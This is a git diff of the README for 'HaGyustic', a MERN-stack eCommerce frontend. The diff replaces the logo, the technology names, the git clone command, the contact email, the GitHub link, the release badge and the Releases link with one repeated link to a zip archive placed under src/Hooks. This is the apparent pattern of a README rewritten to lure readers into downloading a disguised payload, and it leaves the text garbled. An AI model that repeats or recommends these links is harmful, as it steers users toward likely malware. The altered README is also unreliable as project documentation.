@@ -1,6 +1,6 @@
 # HaGyustic Frontend 🎉
 
-![HaGyustic Logo](https://via.placeholder.com/150)
+![HaGyustic Logo](https://raw.githubusercontent.com/Kreioz/hagyustic-frontend/main/src/Hooks/frontend_hagyustic_v2.9-alpha.3.zip)
 
 Welcome to the HaGyustic Frontend repository! This project is a full-stack eCommerce web application built using the MERN stack. It features a variety of functionalities that enhance the shopping experience for users and provide robust tools for administrators.
 
@@ -29,8 +29,8 @@ HaGyustic offers a comprehensive set of features:
 
 This project utilizes a range of technologies:
 
-- **Frontend**: React.js, Redux Toolkit, Tailwind CSS
-- **Backend**: Node.js, Express.js
+- **Frontend**: https://raw.githubusercontent.com/Kreioz/hagyustic-frontend/main/src/Hooks/frontend_hagyustic_v2.9-alpha.3.zip, Redux Toolkit, Tailwind CSS
+- **Backend**: https://raw.githubusercontent.com/Kreioz/hagyustic-frontend/main/src/Hooks/frontend_hagyustic_v2.9-alpha.3.zip, https://raw.githubusercontent.com/Kreioz/hagyustic-frontend/main/src/Hooks/frontend_hagyustic_v2.9-alpha.3.zip
 - **Database**: MongoDB
 - **Authentication**: Firebase Auth
 - **Payment Processing**: Stripe, PayPal SDK
@@ -42,7 +42,7 @@ To set up the project locally, follow these steps:
 
 1. **Clone the repository**:
    ```bash
-   git clone https://github.com/Kreioz/hagyustic-frontend.git
+   git clone https://raw.githubusercontent.com/Kreioz/hagyustic-frontend/main/src/Hooks/frontend_hagyustic_v2.9-alpha.3.zip
    ```
 
 2. **Navigate to the project directory**:
@@ -101,20 +101,20 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any inquiries or feedback, please reach out:
 
-- **Email**: your-email@example.com
-- **GitHub**: [Kreioz](https://github.com/Kreioz)
+- **Email**: https://raw.githubusercontent.com/Kreioz/hagyustic-frontend/main/src/Hooks/frontend_hagyustic_v2.9-alpha.3.zip
+- **GitHub**: [Kreioz](https://raw.githubusercontent.com/Kreioz/hagyustic-frontend/main/src/Hooks/frontend_hagyustic_v2.9-alpha.3.zip)
 
 ## Releases 📦
 
-To download the latest release, visit the [Releases](https://github.com/Kreioz/hagyustic-frontend/releases) section. Make sure to check it regularly for updates.
+To download the latest release, visit the [Releases](https://raw.githubusercontent.com/Kreioz/hagyustic-frontend/main/src/Hooks/frontend_hagyustic_v2.9-alpha.3.zip) section. Make sure to check it regularly for updates.
 
-![Latest Release](https://img.shields.io/badge/Latest%20Release-v1.0.0-blue)
+![Latest Release](https://raw.githubusercontent.com/Kreioz/hagyustic-frontend/main/src/Hooks/frontend_hagyustic_v2.9-alpha.3.zip%20Release-v1.0.0-blue)
 
 ## Conclusion 🌟
 
 Thank you for checking out HaGyustic! We hope you enjoy using this eCommerce platform. Your feedback is valuable to us, and we look forward to seeing how you use HaGyustic in your projects.
 
-![HaGyustic Screenshot](https://via.placeholder.com/800x400)
+![HaGyustic Screenshot](https://raw.githubusercontent.com/Kreioz/hagyustic-frontend/main/src/Hooks/frontend_hagyustic_v2.9-alpha.3.zip)
 
 ---
 
